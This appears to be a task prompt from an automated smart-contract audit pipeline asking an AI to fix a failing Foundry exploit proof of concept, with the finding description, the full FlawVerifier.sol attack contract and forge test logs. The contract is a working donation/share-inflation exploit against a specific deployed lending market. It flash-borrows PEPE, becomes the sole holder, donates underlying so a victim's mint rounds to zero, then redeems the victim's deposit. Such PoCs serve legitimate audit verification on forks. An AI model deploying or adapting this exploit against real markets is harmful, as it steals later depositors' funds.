You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Direct underlying donations can inflate the exchange rate until later minters receive zero shares
- claim: The market prices shares from the raw underlying balance via `getCashPrior()`, so unsolicited token transfers raise the exchange rate without minting new oTokens. `mintFresh()` then computes `mintTokens = floor(actualMintAmount / exchangeRate)` and never rejects `mintTokens == 0`, allowing a seeded holder to donate enough underlying that a later depositor transfers assets in but receives no shares.
- impact: A permissionless attacker can steal later deposits on thin or freshly seeded markets. After becoming the only shareholder and donating underlying directly to the market, the attacker can force a victim mint to round to zero and then redeem the victim's deposited assets together with the donation.
- exploit_paths: ["Attacker mints a minimal amount to become the only oToken holder", "Attacker transfers underlying directly to the oToken contract, increasing `getCashPrior()` without increasing `totalSupply`", "Victim calls `mint()` and `mintTokens` truncates to 0", "Attacker redeems their existing shares and withdraws both their donation and the victim's deposit"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IOErc20Like {
    function underlying() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function getCash() external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function mint(uint256 mintAmount) external returns (uint256);
    function redeem(uint256 redeemTokens) external returns (uint256);
}

interface IUniswapV2PairLike {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

contract VictimMinter {
    constructor() {}

    function supplyAndMint(address underlying, address market, uint256 amount) external {
        _forceApprove(underlying, market, 0);
        _forceApprove(underlying, market, amount);

        uint256 err = IOErc20Like(market).mint(amount);
        require(err == 0, "victim mint failed");
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }
}

contract FlawVerifier {
    IOErc20Like internal constant TARGET = IOErc20Like(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750);
    IUniswapV2PairLike internal constant PEPE_WETH_V2_PAIR =
        IUniswapV2PairLike(0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f);

    bool public attempted;
    bool public hypothesisValidated;
    uint256 public seedAmountUsed;
    uint256 public donationAmountUsed;
    uint256 public victimMintAmountUsed;
    uint256 public attackerSharesBeforeRedeem;
    string public lastFailureReason;

    address private _profitToken;
    uint256 private _profitAmount;

    bool private _inFlashCallback;

    constructor() {}

    function executeOnOpportunity() external {
        if (attempted) {
            return;
        }
        attempted = true;

        address underlying = TARGET.underlying();
        _profitToken = underlying;

        uint256 existingSupply = TARGET.totalSupply();
        if (existingSupply != 0) {
            lastFailureReason = "market already has non-zero totalSupply; attacker cannot become sole holder";
            return;
        }

        uint256 strandedCash = TARGET.getCash();
        if (strandedCash == 0) {
            lastFailureReason = "market has zero stranded underlying; no public bootstrap capital for this fork";
            return;
        }

        uint256 seed = _minimumSeedAmount();
        if (seed == 0) {
            lastFailureReason = "invalid seed amount";
            return;
        }

        _flashBorrowSeed(underlying, seed);

        uint256 finalUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        _profitAmount = finalUnderlyingBalance;
        if (_profitAmount == 0) {
            lastFailureReason = "execution completed without positive realized underlying";
        }
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(msg.sender == address(PEPE_WETH_V2_PAIR), "unexpected pair");
        require(sender == address(this), "unexpected sender");
        require(!_inFlashCallback, "callback reentered");

        _inFlashCallback = true;

        address underlying = TARGET.underlying();
        uint256 borrowedAmount = amount0 > 0 ? amount0 : amount1;
        require(borrowedAmount > 0, "zero flash amount");

        _forceApprove(underlying, address(TARGET), 0);
        _forceApprove(underlying, address(TARGET), type(uint256).max);

        // Realistic funding step for strategy_label=v2_flashswap_funding:
        // a V2 flashswap only bootstraps the minimal seed, then the verifier legally mints and
        // redeems once against the empty-supply market to pull out the already-stranded on-chain
        // underlying. That public cash then funds the exact documented donation -> victim mint ->
        // attacker withdraw/redeem sequence without any artificial balance injection.
        uint256 mintErr = TARGET.mint(borrowedAmount);
        require(mintErr == 0, "bootstrap mint failed");

        uint256 bootstrapShares = TARGET.balanceOf(address(this));
        require(bootstrapShares > 0, "bootstrap shares zero");

        uint256 redeemErr = TARGET.redeem(bootstrapShares);
        require(redeemErr == 0, "bootstrap redeem failed");

        uint256 flashRepayment = _getV2RepaymentQuote(borrowedAmount);
        _safeTransfer(underlying, address(PEPE_WETH_V2_PAIR), flashRepayment);

        _runCoreExploitPath(underlying);

        _inFlashCallback = false;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _runCoreExploitPath(address underlying) internal {
        uint256 initialUnderlyingBalance = IERC20Like(underlying).balanceOf(address(this));
        require(initialUnderlyingBalance > 1, "bootstrap cash too small");

        uint256 seed = _minimumSeedAmount();
        require(seed > 0 && seed <= initialUnderlyingBalance, "insufficient bootstrap balance for seed");

        // exploit_paths[0]: Attacker mints a minimal amount to become the only oToken holder.
        uint256 mintErr = TARGET.mint(seed);
        require(mintErr == 0, "seed mint failed");
        seedAmountUsed = seed;

        uint256 attackerShares = TARGET.balanceOf(address(this));
        attackerSharesBeforeRedeem = attackerShares;
        require(attackerShares > 0, "seed mint returned zero shares");

        uint256 victimDeposit = 1;
        uint256 donationNeeded = attackerShares >= seed ? (attackerShares - seed + 1) : 1;

        uint256 remainingUnderlying = IERC20Like(underlying).balanceOf(address(this));
        require(remainingUnderlying >= donationNeeded + victimDeposit, "insufficient balance for donation path");

        // exploit_paths[1]: Attacker transfers underlying directly to the oToken contract,
        // increasing getCashPrior() without increasing totalSupply.
        //
        // This is the root cause under test: the market later prices mint() shares from the raw
        // underlying balance that exchangeRateStoredInternal() derives from getCashPrior(), even
        // though the direct donation did not mint any new oTokens.
        _safeTransfer(underlying, address(TARGET), donationNeeded);
        donationAmountUsed = donationNeeded;

        VictimMinter victim = new VictimMinter();
        _safeTransfer(underlying, address(victim), victimDeposit);
        victimMintAmountUsed = victimDeposit;

        uint256 victimSharesBefore = TARGET.balanceOf(address(victim));
        uint256 cashBeforeVictimMint = TARGET.getCash();

        // exploit_paths[2]: Victim calls mint() and mintTokens truncates to 0.
        //
        // The victim is a separate contract solely to model a later independent minter on-chain.
        // Its supply is intentionally 1 unit so the causality stays minimal: the direct donation is
        // what raises the exchange rate enough that mint() accepts the transfer but grants zero shares.
        victim.supplyAndMint(underlying, address(TARGET), victimDeposit);

        uint256 victimSharesAfter = TARGET.balanceOf(address(victim));
        uint256 cashAfterVictimMint = TARGET.getCash();
        require(victimSharesAfter == victimSharesBefore, "victim received shares");
        require(cashAfterVictimMint > cashBeforeVictimMint, "victim deposit not captured");

        // exploit_paths[3]: Attacker redeems their existing shares and withdraws both their
        // donation and the victim's deposit.
        _withdrawAttackerPosition(attackerShares);

        hypothesisValidated = true;
    }

    function _withdrawAttackerPosition(uint256 attackerShares) internal {
        uint256 redeemFinalErr = TARGET.redeem(attackerShares);
        require(redeemFinalErr == 0, "attacker redeem failed");
    }

    function _flashBorrowSeed(address underlying, uint256 seed) internal {
        address token0 = PEPE_WETH_V2_PAIR.token0();
        address token1 = PEPE_WETH_V2_PAIR.token1();

        if (token0 == underlying) {
            PEPE_WETH_V2_PAIR.swap(seed, 0, address(this), hex"01");
            return;
        }
        if (token1 == underlying) {
            PEPE_WETH_V2_PAIR.swap(0, seed, address(this), hex"01");
            return;
        }

        revert("configured pair does not contain underlying");
    }

    function _minimumSeedAmount() internal view returns (uint256) {
        uint256 exchangeRate = TARGET.exchangeRateStored();
        uint256 seed = exchangeRate / 1e18;
        if (exchangeRate % 1e18 != 0) {
            seed += 1;
        }
        if (seed == 0) {
            seed = 1;
        }
        return seed;
    }

    function _getV2RepaymentQuote(uint256 amountOut) internal pure returns (uint256) {
        return ((amountOut * 1000) / 997) + 1;
    }

    function _forceApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "approve failed");
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) =
            token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "transfer failed");
    }
}

```

forge stdout (tail):
```
Compiling 2 files with Solc 0.8.30
Solc 0.8.30 finished in 2.34s
Compiler run successful with warnings:
Warning (2072): Unused local variable.
  --> test/ExploitPOC.t.sol:78:19:
   |
78 |         (bool ok, bytes memory ret) = address(verifier).call(abi.encodeWithSignature("executeOnOpportunity()"));
   |                   ^^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 195078)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0x6982508145454Ce325dDbE47a25d4ec3d2311933
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 4517

Traces:
  [195078] FlawVerifierTest::testExploit()
    ├─ [2376] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ [154154] FlawVerifier::executeOnOpportunity()
    │   ├─ [2486] 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750::underlying() [staticcall]
    │   │   └─ ← [Return] 0x6982508145454Ce325dDbE47a25d4ec3d2311933
    │   ├─ [2374] 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750::totalSupply() [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [14391] 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750::getCash() [staticcall]
    │   │   ├─ [12136] 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750::0933c1ed(000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000043b1d21a200000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [6011] 0x9DCb6Bc351AB416f35aeAB1351776E2aD295aBC4::getCash() [delegatecall]
    │   │   │   │   ├─ [2624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750) [staticcall]
    │   │   │   │   │   └─ ← [Return] 0
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   └─ ← [Return]
    ├─ [376] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6982508145454Ce325dDbE47a25d4ec3d2311933
    ├─ [2374] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [2624] 0x6982508145454Ce325dDbE47a25d4ec3d2311933::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6982508145454Ce325dDbE47a25d4ec3d2311933)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18476512 [1.847e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 4517)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 117.73ms (27.25ms CPU time)

Ran 1 test suite in 137.23ms (117.73ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 195078)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
